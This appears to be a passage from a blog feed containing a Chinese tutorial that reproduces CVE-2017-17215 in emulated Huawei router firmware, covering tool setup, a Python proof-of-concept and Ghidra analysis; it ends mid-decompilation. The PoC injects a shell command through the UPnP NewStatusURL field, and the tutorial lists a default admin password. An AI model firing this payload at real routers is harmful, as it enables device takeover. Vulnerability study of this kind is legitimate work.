88d5d70671bea06ff115373643ec6323f2ba82d21282fc01ec022de936d3caea2f73025e1939ab01b3b9da4f13ca87d78a125ae416ee0e56ed9c656e243719d4db18b95d4fb965f3399df320fcce15622beadde20767e50cbb36d94f926c3b8aaa47a787da6d6c226355a43fcb18d14e1847d740120f861be604382e8c703573404fc9f37c55c2b82bdbfec51edca8f2c83a03bb3680f51161e2cd931dbf2bc116e9fd8b1a3f09bacd5614cba987bb8936c638f7df629a41ab2cc4236cdd3fe5af14c9cdf6c63d14ed81bedb9b395fd923657edaed7bf1565137520586ca4b83378b08827a0807eb377dc42cfaa38ab10768071fc8146ad1d9df149554dc20d5aeff18ca051064d742e9ecc69d53094be759b4c5ecd951c3ccf344449a9e94c6afac622bf13c93f9573aa0debdd5aaa28074eaf5881d181cfc5710835a52fbc40b8d81f2bf880ce4c942a5b483057528bd82d07da86cd2024c6e8cd40af35571faf9336d9474af2c36f98c2e2606235f0bdad9fa6be09342feb759d024ff8409fdcf81a304408a8d67b6790e320b8cae0c528ce94963c1f6921d3049acb7c5fd1231b8bf08d5feac3ef09ee2f9df066d2075d28f17e2febca6878ca5cd8d96268b4f77fbdab02d0981951523e9c76c7e7da51a5a2f4b05af48832c7e0e68d838592906c1e4ce43450fc82e4da4be36282defd01265dda6316bb211e12ec1077d0ae2d78ebc273f93136b81a33db4d454947ed017767705510c8e3d6ad4e6db09900d914511549892365fc4d5b5250cb1392e62adfe84c4537278e62cf9a089371df054c1a9a176be20be83d19a45ee9355d8f6a9624e5db5a3104a648b7603763506f62caf20fcc6739341ae430cb25fa9f84e1a6ac9df9dfac2e0ea743b054463350f6e8ce1805bb02928d9096cac369864f7924ffc57b7b81508f94da63dade05d420acd29c97d27f92af237442f581e1b9a2a96411c351213a32c0ad633a52eaa8d0cac9ef8ff26e9bc8015043c3106ef06d6a1e95a0bc3a3b1d7754fb40bc0c2c4ea4b554709d7db4ff40def2d6552f5aa0715a57880c74d8cbe84d0742ebb2e29b1dc9e00fb2d70e6946eabcde357ec30cb72098f9fa36b96af64ce99a43efceb2708a0ad21a34f9d6e500da54d6b6c6c4e5fb970b42ef6f8e04bc75fe0581bd5bb2cb5018506cac5be19e1cbf6056969a0b069668d38b4e281fec92b45b2086ff74a5aea0828877627071efac78dc10a6d7c3666afa4af742a217475c6f6c3e92c447ad734956b2c96a515243cb82f03cc3a40f668cd3aa651c956b5a83fef491a49a396156782122f8031bc4c6fbb628871c357edaf58e64d902f429d0cbee1756b0b4010e40e3e0cfa1d40e1d5c6e1a27f39544946c73976fed2054aa4be0b9cd24a56e356f53f287c17500c5321b0b2e6260d41b2a4503dd88d1189de3ab34a5efbfcc4f1183be262de5adc7b526dda1af343cc1606b09ef2227cb1d38586aef4ffc9451f0c6d80243fa956b02a0238f3bb3d092fdc2242c1f834f64810a142ec3d5133045686976036a25166124315fb0598394c28ed792eae98ce5206b7186d9041edddb4051c323a2f311dbebd1ea9f6559472ebba42d02780f2cbdd83bf1d4eb743576177b3f797a343ad44d2128b94d33a6f1a9fe0f59d761f75ac7ac7d041ea89aa8ee3b2a07c61acddfa00b0a95caa73300ac9268503f3f5a2a0fc7f44c96b1d04cac3e8220d913357281dc3562c09ddb5de59f9690b16fb9fed0cc20eb2be8b367748a7d26ebef78a2ff5d966aed212b1c5dc794e4b15871c5c7b5ca8ea8ff465c0477a021ab66c9c58e82ca6529c39581b053c8347e2e1c74cca1b7552f3e0d55786e0f111827a2f3b11b6be60b512e304967775ad9aa69e57e43b327a925416c2f74971c3247fa95465ba60ae8397ac0ff5c2cf4ecf5e678b30b4218db4df805afc57df270e7af42cd623fd50e2b302b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">chat nc 43.96.147.93</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>chats</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-17215复现</title>
    <link href="/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/06/23/CVE-2017-17215%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文首发于合天网安实验室，链接时间太久忘了。</p></blockquote><p>😈远古时期学习路由器固件分析，并尝试复现了一个简单的CVE。中间遇到了很多的坑点，虽然把漏洞复现了，但是过程可谓曲折。</p><p>ps：该文章以复现CVE-2017-17215为基础，提供一个详细的固件分析入门手册。</p><h2 id="0x01-环境准备"><a class="header-anchor" href="#0x01-环境准备">¶</a>0x01 环境准备</h2><p>环境准备是分析固件的基础。手里的环境是ubuntu20，中间也尝试过过kali2020。<strong>期间尝试过自动化工具Firmadyne，以及其plus版本</strong>，但是都失败了，这里一些师傅那里得到建议，Firmadyne工具的镜像和内核太老了，建议手动换新的，此外该自动化分析工具其实也有较大的局限性，所以我建议<strong>手动配置一个固件模拟环境十分有必要</strong></p><p>下面是环境的配置过程。</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ubuntu20 python2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h3 id="Binwalk安装"><a class="header-anchor" href="#Binwalk安装">¶</a>Binwalk安装</h3><p>Binwalk是一款优秀的固件提取工具，我们拿到手的，需要分析的固件大都是bin文件，这时候BInwalk工具就起到了从中分析出文件系统的作用。</p><p><strong>apt下载的和kali自带的Binwalk</strong>缺少部分重要的分析插件，建议手动编译安装，避免固件分析失败。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> remove binwalk  //如果有的话，先删除旧版的Binwalk<span class="token function">git</span> clone https://github.com/devttys0/binwalk //从git上获取binwalk<span class="token builtin class-name">cd</span> binwalk<span class="token function">sudo</span> python3 setup.py <span class="token function">install</span> //Binwalk使用python3编译安装//如果是python2环境，就需要先安装以下依赖<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-lzma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果git出现问题可以尝试把<code>https://</code>改成<code>git://</code>，等待编译完毕即可完成Binwalk的安装。</p><p>然后安装一些其他的依赖。<br>Binwalk uses the pycrypto library to decrypt some known encrypted firmware images:<br>Binwalk提供分析一些加密固件的插件，但是用到了pycrypto库，所以我们还要再安装一下该库。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-crypto<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-crypto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Binwalk提供图片和视觉分析。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> pyqtgraph <span class="token comment"># Python3.x</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> libqt4-opengl python3-opengl python3-pyqt4 python3-pyqt4.qtopengl python3-numpy python3-scipy python3-pip<span class="token function">sudo</span> pip3 <span class="token function">install</span> pyqtgraph<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>Capstone disassembly framework的插件运行需要的python模块如下。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Python2.7</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python-pip<span class="token function">sudo</span> pip <span class="token function">install</span> capstone<span class="token comment"># Python3.x </span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> python3-pip<span class="token comment"># Install standard extraction utilitie</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> mtd-utils <span class="token function">gzip</span> <span class="token function">bzip2</span> <span class="token function">tar</span> arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools<span class="token comment"># Install sasquatch to extract non-standard SquashFS image</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> zlib1g-dev liblzma-dev liblzo2-dev  $ <span class="token function">git</span> clone https://github.com/devttys0/sasquatch  $ <span class="token punctuation">(</span>cd sasquatch <span class="token operator">&amp;&amp;</span> ./build.sh<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以下的选择性安装即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install jefferson to extract JFFS2 file systems</span>$ <span class="token function">sudo</span> pip <span class="token function">install</span> cstruct$ <span class="token function">git</span> clone https://github.com/sviehb/jefferson$ <span class="token punctuation">(</span>cd jefferson <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install ubi_reader to extract UBIFS file systems</span>$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> liblzo2-dev python-lzo$ <span class="token function">git</span> clone https://github.com/jrspruitt/ubi_reader$ <span class="token punctuation">(</span>cd ubi_reader <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install yaffshiv to extract YAFFS file systems</span>$ <span class="token function">git</span> clone https://github.com/devttys0/yaffshiv$ <span class="token punctuation">(</span>cd yaffshiv <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> python setup.py <span class="token function">install</span><span class="token punctuation">)</span>  <span class="token comment"># Install unstuff (closed source) to extract StuffIt archive files</span>$ <span class="token function">wget</span> -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz <span class="token operator">|</span> <span class="token function">tar</span> -zxv$ <span class="token function">sudo</span> <span class="token function">cp</span> bin/unstuff /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上是手动安装所有库的过程，如果想要省时间，也可以尝试一下Binwalk的安装文件夹中的自动安装脚本，<code>sudo ./deps.sh</code>，但是这样的安装耗时较长，且容易报错，建议还是采用手动安装需要的几个依赖即可。</p><p>安装好了之后，可以尝试一下分析固件。<br><code>binwalk -Me 固件</code><br><img src="https://i.bmp.ovh/imgs/2022/01/7ad77b1b981aee35.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/20586cf2af94373f.png" alt=""></p><p>在当前的文件夹下即可得到文件系统的根目录。<br>通过<code>file ./bin/busybox</code>的指令即可得到相应的文件架构。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> ./bin/busybox./bin/busybox: ELF <span class="token number">32</span>-bit MSB executable, MIPS, MIPS32 rel2 version <span class="token number">1</span> <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>至此Binwalk安装完毕。</p><h3 id="Qemu安装"><a class="header-anchor" href="#Qemu安装">¶</a>Qemu安装</h3><p>相对于Binwalk的手动编译，Qemu相对简单一点，稍微有所了解的同志可能会知道Qemu有系统和用户模式两种。安装的话可以选择不同的需求安装，这里我们选择全部都安装。</p><p>Qemu的安装没有很多讲究，一键脚本安装即可</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git://git.qemu.org/qemu.git<span class="token builtin class-name">cd</span> qemu<span class="token function">git</span> submodule init<span class="token function">git</span> submodule update --recursivesudo<span class="token function">apt</span> <span class="token function">install</span> libglib2.0 libglib2.0-devsudo<span class="token function">apt</span> <span class="token function">install</span> autoconf automake libtoolcd qemu <span class="token operator">&amp;&amp;</span> ./configuremakesudo <span class="token function">make</span> <span class="token function">install</span>//apt 安装<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user-static<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-system<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu-user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>安装完毕之后，如下图<br><img src="https://i.bmp.ovh/imgs/2022/01/d4c999e08069c699.png" alt=""></p><h2 id="0x02-漏洞验证"><a class="header-anchor" href="#0x02-漏洞验证">¶</a>0x02 漏洞验证</h2><p>工具安装完毕之后，以下将对漏洞进行验证。</p><h3 id="启动服务"><a class="header-anchor" href="#启动服务">¶</a>启动服务</h3><p>首先，需要给Qemu虚拟机准备一个新的网桥，利用该网桥使得Qemu机可以联通互联网，并且和VM虚拟机处于同一网段。</p><p>采用的基本方法是分配一个新网卡给Qemu机器，并且使用网桥，将其桥接到原来的网卡。首先需要安装网桥配置工具。</p><p><code>apt-get install bridge-utils</code><br><code>sudo apt-get install uml-utilities </code></p><p>然后使用下面的脚本即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/sh</span><span class="token function">sudo</span> brctl addbr br0 //创建网桥br0<span class="token function">sudo</span> brctl addif br0 ens33 //连接到ens33<span class="token function">sudo</span> <span class="token function">ifconfig</span> br0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> <span class="token function">ifconfig</span> ens33 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> dhclient br0//给该网桥分配IP地址，此前不能给ens33分配ipv4的地址<span class="token function">sudo</span> tunctl -t tap0 -u root<span class="token function">sudo</span> brctl addif br0 tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 <span class="token number">0.0</span>.0.0 promisc up<span class="token function">sudo</span> brctl showstp br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以上内容保存到一个bash脚本即可，开启虚拟机之前运行一遍。<br><img src="https://i.bmp.ovh/imgs/2022/01/17975a3eca5dd634.png" alt=""></p><p>网络配置好了之后，使用相应的镜像和内核文件启动一个qemu机。<br><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a><br>以上网址可以下载内核和镜像。</p><p>期待使用指定的网桥，且在当前中断开启qemu机器。<br><code>sudo qemu-system-mips -M malta -kernel ~/Desktop/IOT/vmlinuxs/vmlinux-2.6.32-5-4kc-malta -hda ~/Desktop/IOT/Images/debian_squeeze_mips_standard.qcow2 -append &quot;root=/dev/sda1 console=tty0&quot; -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no</code></p><p>指令的具体含义可以看以下Qemu的说明文档。<a href="https://wiki.archlinux.org/title/QEMU_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">https://wiki.archlinux.org/title/QEMU_(简体中文)</a></p><p>虚拟机的root账户密码是root，成功登录之后，尝试ping以下外网，看能否ping通。<br><img src="https://i.bmp.ovh/imgs/2022/01/2b3815aba7ca25ec.png" alt=""></p><p>然后使用scp指令，把文件系统都传递给Qemu虚拟机。<br><code>scp -r 路径 ip@username:虚拟机路径</code><br><code>$ scp -r squashfs-root  root@192.168.146.137:~/sqashfs-root</code></p><p>文件传输完毕之后，为了能够让VM机访问到Qemu机，使用mount挂载以下dev和proc</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> -o <span class="token builtin class-name">bind</span> /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>不同的文件系统有不同的挂载指令。</p><p>此时注意到<code>CVE-2017-17215</code>的漏洞存在于<code>upnp和mic</code>服务中。这两项服务都和网络有关，为了方式漏洞服务启动后，网络环境的变化，使用ssh远程登录该Qemu机器，新建一个console，利用该console启动漏洞服务，利用原有的Qemu窗口保持Qemu的ip不发生改变。</p><p>在ssh窗口输入<code>chroot . /bin/sh</code>更改根目录，避免动态链接库报错。<br><img src="https://i.bmp.ovh/imgs/2022/01/b47cbc250d9e899d.png" alt=""></p><p>然后执行漏洞服务即可。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ./bin/upnp</span><span class="token comment"># ./bin/mic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>等待执行结束，果然ip发生了改变，利用ifconfig指令把ip地址改回去。<br><img src="https://i.bmp.ovh/imgs/2022/01/a4a0a7d9ee1cb49f.png" alt=""></p><p>此时，尝试访问该路由器（Qemu机）的ip地址，可以发现成功访问。<br><img src="https://i.bmp.ovh/imgs/2022/01/f329dee4d718e098.png" alt=""></p><p>默认账户admin，@Hua1234</p><h3 id="poc测试"><a class="header-anchor" href="#poc测试">¶</a>poc测试</h3><p>漏洞服务开启之后，可以验证以下漏洞的poc，用的是下面的exp</p><figure><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;/bin/busybox mkdir shell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.146.137:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>post请求的IP地址写Qemu机的IP地址。执行后，结果如下：<br><img src="https://i.bmp.ovh/imgs/2022/01/ce55e82d38946b38.png" alt=""><br>成功rce。</p><h2 id="0x03-漏洞分析"><a class="header-anchor" href="#0x03-漏洞分析">¶</a>0x03 漏洞分析</h2><p>漏洞环境和服务都已搭建成功，并且已经成功验证。接下来结合固件分析更加深入理解该漏洞的成因。</p><h3 id="分析漏洞函数"><a class="header-anchor" href="#分析漏洞函数">¶</a>分析漏洞函数</h3><p>首先，使用Ghidra打开upnp文件。由poc不难发现，注入命令的位置出现在<code>&lt;NewStatusURL&gt;</code>节点以内。所以先尝试搜索该字符串。</p><p>在字符串搜索框搜索，<code>NewStatusURL</code>,的到如下函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FUN_0040749c</span><span class="token punctuation">(</span><span class="token keyword">int</span> param_1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_418<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_414<span class="token punctuation">;</span>  <span class="token keyword">char</span> acStack1040 <span class="token punctuation">[</span><span class="token number">1028</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewDownloadURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_418<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>local_418 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>     <span class="token punctuation">(</span>iVar1 <span class="token operator">=</span> <span class="token function">ATP_XML_GetChildNodeByName</span>                        <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>undefined4 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>param_1 <span class="token operator">+</span> <span class="token number">0x2c</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"NewStatusURL"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>local_414<span class="token punctuation">)</span><span class="token punctuation">,</span> iVar1 <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>local_414 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">snprintf</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">"upg -g -U %s -t \'1 Firmware Upgrade Image\' -c upnp -r %s -d -b"</span><span class="token punctuation">,</span>               local_418<span class="token punctuation">,</span>local_414<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">system</span><span class="token punctuation">(</span>acStack1040<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> iVar1<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>容易发现system函数的参数来源于<code>snprintf</code>，再看snprintf函数中，参数的拼接用的是字符串<code>%s</code>传入，没有做任何的过滤处理，由此可以判断，这是由<code>snprintf</code>参数过滤不严格引起的，命令拼接RCE.</p><p>尝试查看该函数的交叉引用，发现失败。<br><img src="https://i.bmp.ovh/imgs/2022/01/e3aa953461727c2d.png" alt=""><br>这说明该函数是被间接调用的，目前为止，笔者只能想到，该函数是由虚函数表调用（比较常见）</p><p>寻找该函数的调用到目前为止，无法前进，但是漏洞的成因找到了。</p><h3 id="漏洞触发流程"><a class="header-anchor" href="#漏洞触发流程">¶</a>漏洞触发流程</h3><p>刚才我们尝试从漏洞函数的调用去寻找漏洞的触发点，失败了，接下来，我们换一种方法，正向的去寻找漏洞的触发点。进入文件系统，尝试搜索，该字符串在哪里出现了。<code>grep -r &quot;NewStatusURL&quot;</code></p><p><img src="https://i.bmp.ovh/imgs/2022/01/d2e4c615c810c54f.png" alt=""><br>在upnp的文件夹下面发现了仅有<code>DevUpg.xml</code>中有该字符串。（说明只有该地方用到了该字符串）</p><p>老样子，在Ghidra中搜索<code>DevUpg.xml</code>字符串，找到一个服务注册函数。</p><figure><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ATP_UPNP_RegDeviceAndService</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> iVar1<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar2<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar3<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar4<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar5<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar6<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar7<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar8<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar9<span class="token punctuation">;</span>  <span class="token keyword">int</span> iVar10<span class="token punctuation">;</span>  undefined4 local_128<span class="token punctuation">;</span>  undefined4 local_124<span class="token punctuation">;</span>  undefined4 local_120<span class="token punctuation">;</span>  undefined4 local_11c<span class="token punctuation">;</span>  undefined4 local_118<span class="token punctuation">;</span>  undefined4 local_114<span class="token punctuation">;</span>  undefined4 local_110<span class="token punctuation">;</span>  undefined4 local_10c<span class="token punctuation">;</span>  undefined4 local_108<span class="token punctuation">;</span>  undefined4 local_104<span class="token punctuation">;</span>  undefined4 local_100<span class="token punctuation">;</span>  undefined4 local_fc<span class="token punctuation">;</span>  undefined4 local_f8<span class="token punctuation">;</span>  undefined4 local_f4<span class="token punctuation">;</span>  undefined4 local_f0 <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_e0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_dc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_d0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_cc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_c0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_bc<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_b0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_ac<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a8<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a4<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_a0<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_9c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_98<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_94<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_90<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_8c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_88<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_84<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_80<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_7c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_78<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_74<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_70<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_6c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_68<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_64<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_60<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_5c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_58<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_54<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_50<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_4c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_48<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_44<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_40<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_3c<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_38<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_34<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_30<span class="token punctuation">;</span>  <span class="token keyword">int</span> local_2c<span class="token punctuation">;</span>    local_128 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  local_124 <span class="token operator">=</span> 